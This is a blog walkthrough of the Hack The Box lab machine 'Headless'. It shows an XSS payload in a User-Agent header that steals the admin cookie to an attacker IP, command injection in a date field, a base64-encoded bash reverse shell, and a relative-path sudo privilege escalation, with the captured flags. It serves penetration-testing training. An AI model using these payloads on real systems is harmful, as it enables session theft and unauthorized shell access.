---
layout: post
title: Hack The Box Walkthrough - Headless
date: 2024-06-09
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/06/HTB/Headless
img: 2024/06/Headless/Headless.png
---

In this very easy box, I exploited an XSS vulnerability in the page the display hacking attempts. Then I got a reverse shell through remote code execution. And finally, elevated my privileges through a script that did not use absolute path.

* Room: Headless
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Headless](https://app.hackthebox.com/machines/Headless)
* Author: [dvir1](https://app.hackthebox.com/users/1422414)

## Enumeration

I started the box by scanning for open ports with Rustscan.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.243.69:22
Open 10.129.243.69:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 09:34 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:34

...

Host is up, received echo-reply ttl 63 (0.032s latency).
Scanned at 2024-06-09 09:34:14 EDT for 99s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 09 Jun 2024 13:34:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/9%Time=6665AF5C%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Sun,\x2009\x20Jun\x202024\x2013:34:20\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\

.. 

Uptime guess: 18.011 days (since Wed May 22 09:20:20 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   31.65 ms 10.10.14.1
2   31.59 ms target (10.129.243.69)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.33 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 43 (3.693KB)

```

I also scanned for UDP ports, but did not find anything of interest.

Port 5000 had a web server, so I scanned for hidden pages with Feroxbuster.

```bash
$ feroxbuster -u http://target.htb:5000 -o ferox.txt 
                                                                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://target.htb:5000/support
200      GET       96l      259w     2799c http://target.htb:5000/
500      GET        5l       37w      265c http://target.htb:5000/dashboard
[####################] - 4m    119602/119602  0s      found:3       errors:30     
[####################] - 4m    119601/119601  562/s   http://target.htb:5000/  
```

There was not much in the application. `/support` had a contact form and `/dashboard` was unauthorized.

## XSS

I opened a browser to look at the website on port 5000.

![Website](/assets/images/2024/06/Headless/Website.png "Website")

The main page had a countdown and a button to a support page.

![Contact Support](/assets/images/2024/06/Headless/ContactSupport.png "Contact Support")

I tried sending some Cross Site Scripting payloads. It detected my payloads as malicious and gave me an error.

![Hacking Detected](/assets/images/2024/06/Headless/HackingDetected.png "Hacking Detected")

My attempts were blocked. But it also displayed my request headers back to me. I tried sending my malicious payload in a header.

```http
POST /support HTTP/1.1
Host: target.htb:5000
User-Agent: <img src="http://10.10.14.121/agent" />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://target.htb:5000
Connection: keep-alive
Referer: http://target.htb:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=first&lname=last&email=test%40test.com&phone=phone&message=<img src="http://10.10.14.121/message" />
```

I started a web server on my machine and a few seconds after my request I got a request from the server.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.243.69 - - [09/Jun/2024 09:55:36] code 404, message File not found
10.129.243.69 - - [09/Jun/2024 09:55:36] "GET /agent HTTP/1.1" 404 -
```

It was vulnerable to XSS and something on the server was looking at the reports. I tried sending my server the cookies of the user looking at the reports.

```http
POST /support HTTP/1.1
Host: target.htb:5000
User-Agent: <script>new Image().src="http://10.10.14.121/cookie?c="+document.cookie;</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://target.htb:5000
Connection: keep-alive
Referer: http://target.htb:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=first&lname=last&email=test%40test.com&phone=phone&message=<img src="http://10.10.14.121/message" />
```

I waited, and got the admin cookie.

```bash
10.129.243.69 - - [09/Jun/2024 09:58:48] code 404, message File not found
10.129.243.69 - - [09/Jun/2024 09:58:48] "GET /cookie?c=is_admin=REDACTED HTTP/1.1" 404 -
```

I changed my cookie value in the browser and tried accessing the dashboard again.

![Dashboard](/assets/images/2024/06/Headless/Dashboard.png "Dashboard")

It worked.

## Remote Code Execution

The dashboard had only one functionality. It generated a health report for a date. It seemed to always give the same response, even with invalid dates.

I tried sending it a command to run.

```http
POST /dashboard HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://target.htb:5000
Connection: keep-alive
Referer: http://target.htb:5000/dashboard
Cookie: is_admin=REDACTED
Upgrade-Insecure-Requests: 1

date=2023-09-16;ls
```

It got executed.

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sun, 09 Jun 2024 14:00:17 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2136
Connection: close

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Administrator Dashboard</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
        }

        .container {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
            margin: 20px auto;
            max-width: 400px;
        }

        h1 {
            color: #333;
        }

        label {
            display: block;
            font-weight: bold;
            margin-top: 10px;
        }

        select,
        input[type="date"],
        input[type="text"],
        button {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        select {
            height: 40px;
        }

        button {
            background-color: #007BFF;
            color: #fff;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Administrator Dashboard</h1>
        <p>Generate a website health report:</p>

        <form action="/dashboard" method="post">
            <label for="date">Select Date:</label>
            <input type="date" id="date" name="date" value="2023-09-15" required>
            <button type="submit">Generate Report</button>
        </form>
    </div>
    <div id="output-container">
        <div id="output-content" style="background-color: green; color: white; padding: 10px; border-radius: 5px;">
            Systems are up and running!
            app.py
            dashboard.html
            hackattempt.html
            hacking_reports
            index.html
            inspect_reports.py
            report.sh
            support.html

        </div>
    </div>
</body>

</html>
```

I had Remote Code Execution. With this, it was simple to get a shell. I created a payload to add to the command.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.121/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAK
```

And sent it to the server.

```http
POST /dashboard HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://target.htb:5000
Connection: keep-alive
Referer: http://target.htb:5000/dashboard
Cookie: is_admin=REDACTED
Upgrade-Insecure-Requests: 1

date=2023-09-16;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAK|base64 -d|bash
```

This gave me a shell as a user, and the first flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.121] from (UNKNOWN) [10.129.243.69] 51712
bash: cannot set terminal process group (1163): Inappropriate ioctl for device
bash: no job control in this shell

dvir@headless:~/app$ whoami
whoami
dvir

dvir@headless:~/app$ pwd
pwd
/home/dvir/app

dvir@headless:~/app$ ls
ls
app.py
dashboard.html
hackattempt.html
hacking_reports
index.html
inspect_reports.py
report.sh
support.html

dvir@headless:~/app$ ls ../
cls ../
app
geckodriver.log
user.txt

dvir@headless:~/app$cat ../user.txt
cat ../user.txt
df9a2a09375fabaae3a73c7b19d4677f
```

## Getting root

Once I had a shell, I looked at what I could do.

```bash
dvir@headless:~/app$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

dvir@headless:~/app$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.01
Database service is not running. Starting it...
```

I was allowed to run a script as any user. The script appeared to be doing a few checks on the server. I looked at its source code.

```bash
dvir@headless:~/app$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

The call to `./initdb.sh` stood out in the script. It was the only command that did not use an absolute path. Instead it was being executed in the current directory. I needed to create a script with this name in my home folder, and it would be executed as root with `sudo`.

I created a script that launched bash and made it executable.

```bash
dvir@headless:~$ cat initdb.sh 
#!/bin/bash
/bin/bash

dvir@headless:~$ chmod +x initdb.sh
```

Then I ran the system check script with sudo to become root and read the flag.

```bash
dvir@headless:~$ sudo /usr/bin/syscheck 
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...

whoami
root

cat /root/root.txt
1688fe0720c45947b2882e29bf6b1233
```